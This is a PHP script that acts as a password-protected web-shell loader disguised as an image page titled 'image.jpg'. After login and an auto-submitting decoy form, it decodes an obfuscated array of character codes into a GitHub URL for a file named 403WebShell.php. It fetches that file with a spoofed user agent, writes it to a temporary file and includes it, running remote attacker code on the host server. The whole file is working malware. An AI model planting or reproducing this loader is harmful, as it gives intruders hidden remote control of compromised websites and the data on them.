<?php
ini_set('session.gc_maxlifetime', 86400);
session_set_cookie_params(86400);

session_start();

$hashed_password = '$2b$12$tpumex1eLs.8Jr44/UH2geFuQBPddqW8PA.zaPkB7RgjPhnldk036';

if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: ?");
    exit;
}

if (!isset($_SESSION['plaga_auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_password)) {
            $_SESSION['plaga_auth'] = true;
            header("Location: ?");
            exit;
        }
        die("Password salah bego");
    }
    ?>
    <form method="post">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
    <?php
    exit;
}

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $_SESSION['logged_in'] = true;
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>image.jpg</title>
        <style>
            body {
                margin: 0;
                padding: 0;
                background: #fff;
                height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            img {
                max-width: 100%;
                max-height: 100%;
            }
        </style>
        <script>
            window.onload = function() {
                document.getElementById('x').submit();
            };
        </script>
    </head>
    <body>
        <img src="image.jpg" alt="image.jpg">
        <form method="POST" id="x"></form>
    </body>
    </html>
    <?php
    exit;
}

$a = [104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,121,111,110,51,122,117,47,52,48,51,87,101,98,83,104,101,108,108,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,52,48,51,87,101,98,83,104,101,108,108,46,112,104,112];
$url = implode('', array_map("chr", $a));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla");
$r = curl_exec($ch);
curl_close($ch);

if ($r && strpos($r, "<?php") !== false) {
    $t = tmpfile();
    fwrite($t, $r);
    $m = stream_get_meta_data($t);
    include $m['uri'];
    fclose($t);
}
?>
